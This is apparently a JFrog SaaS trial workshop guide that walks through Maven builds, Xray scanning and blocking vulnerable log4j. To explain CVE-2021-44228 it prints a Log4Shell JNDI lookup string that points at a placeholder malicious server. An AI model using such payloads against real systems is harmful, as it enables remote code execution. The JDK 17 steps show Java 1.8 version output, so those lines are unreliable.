# 🏗️ JFrog SaaS Trial Workshop Guide

Welcome to the **JFrog SaaS Trial Workshop!** 🎓  
This guide will help you get started with JFrog SaaS and practice building a Maven project.

## 📝 Prerequisites
### JDK 17 Installation
<details>
<summary> Click to expand Maven installation steps </summary>

1. **Install JDK**
   - Download and install JDK from [OpenJDK](https://jdk.java.net/archive/)

2. **Configure Environment Variables**
   <details>
   <summary>Click to expand configuration steps</summary>

   - **Set JAVA_HOME**
     1. Open System Properties (Win + S → "Environment Variables")
     2. Click "Environment Variables" → "New" under System variables
     3. Set:
        ```
        Variable name: JAVA_HOME
        Variable value: C:\Program Files\Java\jdk-17
        ```
   
   - **Add Java to PATH**
     1. In System variables, select "Path" → "Edit"
     2. Click "New" and add:
        ```
        %JAVA_HOME%\bin
        ```
     3. Click "OK" to save
   </details>

3. **Verify Installation**
   ```bash
   # Check Java version
   java -version
   
   # Check Java compiler
   javac -version
   ```
   
   Expected output:
   ```
   openjdk version "1.8.0_442-internal"
   OpenJDK Runtime Environment (build 1.8.0_442-internal-b06)
   OpenJDK 64-Bit Server VM (build 25.442-b06, mixed mode)
   ```
</details>

### Maven 3.6+
<details>
<summary>Click to expand Maven installation steps</summary>

1️⃣ **Download Maven**
   - Go to [Apache Maven download page](https://maven.apache.org/download.cgi)
   - Download the Binary zip archive (e.g., `apache-maven-3.9.6-bin.zip`)

📂 2️⃣ **Extract Maven**
   - Extract the downloaded ZIP file to a directory, e.g.:
     ```
     C:\Program Files\Apache\Maven
     ```
   - Your Maven folder structure should look like:
     ```
     C:\Program Files\Apache\Maven\apache-maven-3.9.6
     ```

⚙️ 3️⃣ **Set Environment Variables**
   <details>
   <summary>Click to expand environment variables configuration</summary>

   ### Windows Environment Setup
   
   #### Method 1: Using System Properties
   ```bash
   # 1. Open System Properties
   # Press Win + S and type "Environment Variables"
   # Or right-click on This PC → Properties → Advanced system settings
   
   # 2. Click "Environment Variables" button
   # 3. Under "System variables" section, click "New"
   # 4. Set MAVEN_HOME:
   Variable name:  MAVEN_HOME
   Variable value: C:\Program Files\Apache\Maven\apache-maven-3.9.6
   
   # 5. Find "Path" variable, click "Edit"
   # 6. Click "New" and add:
   %MAVEN_HOME%\bin
   # 7. Click "OK" on all windows to save
   ```

   #### Method 2: Using Command Line
   ```bash
   # Run Command Prompt as Administrator
   
   # Set MAVEN_HOME
   setx MAVEN_HOME "C:\Program Files\Apache\Maven\apache-maven-3.9.6" /M
   
   # Add to PATH
   setx PATH "%PATH%;%MAVEN_HOME%\bin" /M
   ```

   ### Verify Installation
   ```bash
   # Open a new Command Prompt and run:
   mvn -version
   ```
   
   Expected output:
   ```
   Apache Maven 3.9.6 (...)
   Maven home: C:\Program Files\Apache\Maven\apache-maven-3.9.6
   Java version: 1.8.0_442, vendor: Oracle Corporation
   Java home: C:\Program Files\Java\jdk1.8.0_442
   Default locale: en_US, platform encoding: UTF-8
   OS name: "windows 10", version: "10.0", arch: "amd64", family: "windows"
   ```

   > **Note:** After setting environment variables, you need to open a new Command Prompt for the changes to take effect.
   </details>
</details>

## 🚀 Getting Started

### 1. Apply for JFrog SaaS Trial
1. [Apply for JFrog SaaS Trial](https://jfrog.com/start-free/)  
Select "14-Day Free Trial", it will give you own JFrog Platform.
![alt text](images/trial.png)
2. Ensure you have access to:
   - ✅ **JFrog Artifactory (SaaS)**
   - ✅ **JFrog Xray** 

### 2. Clone the Project
```bash
git clone https://github.com/JFrogChina/jfrog-poc-samples.git
cd jfrog-poc-samples/maven-sample
```

### 3. Create Maven Repositories
![img_6.png](images/img_6.png)
1. Log in to JFrog SaaS Platform
2. Click **Quick Repository Creation** (top-right)
3. Select **Maven** and create:
   - Local Repo: `sample-libs-snapshot-local` `sample-libs-release-local`
   - Remote Repo: `sample-maven-remote`
   - Virtual Repo: `sample-libs-snapshot` `sample-libs-release`

### 4. Configure JFrog CLI
1. [Download JFrog CLI](https://jfrog.com/getcli/)
2. Configure your environment:
   ```shell
   jf c add saas
   ```
   Follow prompts to enter:
   - JFrog Platform URL: `https://<YOUR_DOMAIN>.jfrog.io`
   - username
   - password or Reference Token (from Profile → Edit Profile → Generate an Identity Token)

### 5. Configure Maven
```shell
cd maven-sample
jf mvnc
```
This generates a `settings.xml` pointing to your SaaS repositories.

### 6. Build and Deploy
```shell
jf mvn clean install -f pom.xml --build-name=sample-maven-build --build-number=1
jf mvn deploy --build-name=sample-maven-build --build-number=1
jf rt bp sample-maven-build 1
```

### 7. Verify Deployment
- Check **Artifactory → Artifacts** for deployed files
- View build info in **Builds** section

### 8. Enable Xray Scanning
1. Go to **JFrog Xray → Index Resource**
2. Add to watch:
   - Repositories: `sample-libs-snapshot-local` `sample-libs-release-local`
   - Builds: `sample-maven-build`

### Understanding log4j Vulnerability
The log4j vulnerability (CVE-2021-44228) is detected because your project uses log4j-core 2.14.0. However, it's only exploitable when:

1. Using vulnerable logging patterns:
   ```java
   // Vulnerable
   logger.info("${jndi:ldap://malicious-server/exploit}");
   
   // Safe
   logger.info("User logged in: {}", username);
   ```

2. **AND** when:
   - Logging user-controlled input
   - Input contains `${jndi:ldap://...}` pattern
   - Application has network access to malicious server

This explains why Xray shows many false positives - vulnerabilities exist in code but aren't exploitable in your use case.

### 9. Remediate log4j Vulnerability

#### 9.1 Review Vulnerability
JFrog Advanced Security has identified this log4j package as a true positive. You can view the detailed evidence in the security report.
![img_1.png](images/img_1.png)

#### Review the False Positive Results
![img_5.png](images/img_5.png)
> **86% of critical/high vulnerabilities are false positives**

![img_4.png](images/img_4.png)

#### 9.2 Block Vulnerable Version
![img_7.png](images/img_7.png)
1. **Create Block Condition:**  
   Administrator → Curation Settings → Create Condition  
   ![img.png](images/img.png)

2. **Create Policy:**  
   ![img_2.png](images/img_2.png)

3. **Clean Cache:**
   ```bash
   rm -rf ~/.m2/repository/org/apache/logging/log4j/*
   ```

4. **Verify Block:**
   ```shell
   [main] ERROR org.apache.maven.cli.MavenCli - Failed to execute goal on project app-boot: Could not resolve dependencies for project com.example.jfrog:app-boot:war:1.0.2: Could not transfer artifact org.apache.logging.log4j:log4j-core:jar:2.14.0 from/to artifactory-release (https://demo.jfrogchina.com/artifactory/alex-maven): authorization failed for https://demo.jfrogchina.com/artifactory/alex-maven/org/apache/logging/log4j/log4j-core/2.14.0/log4j-core-2.14.0.jar, status: 403 Forbidden -> [Help 1]
   ```
   ![img_3.png](images/img_3.png)

5. **Fix: Update log4j Version**
   ```xml
   <dependency>
       <groupId>org.apache.logging.log4j</groupId>
       <artifactId>log4j-core</artifactId>
       <version>2.17.1</version>
   </dependency>
   ```

6. **Rebuild:**
   ```shell
   jf mvn clean
   jf mvn deploy --build-name=sample-maven-build --build-number=2
   jf rt bp sample-maven-build 2
   ```

The build should be successful and the issue was fixed.

7. **Analysis of Vulnerability Fixing Trends:**
Platform → Xray → Scan List → Builds
![alt text](images/buildList.png)

The build should complete successfully, confirming that the security issue has been fixed.

> **Happy building and stay secure! 🚀**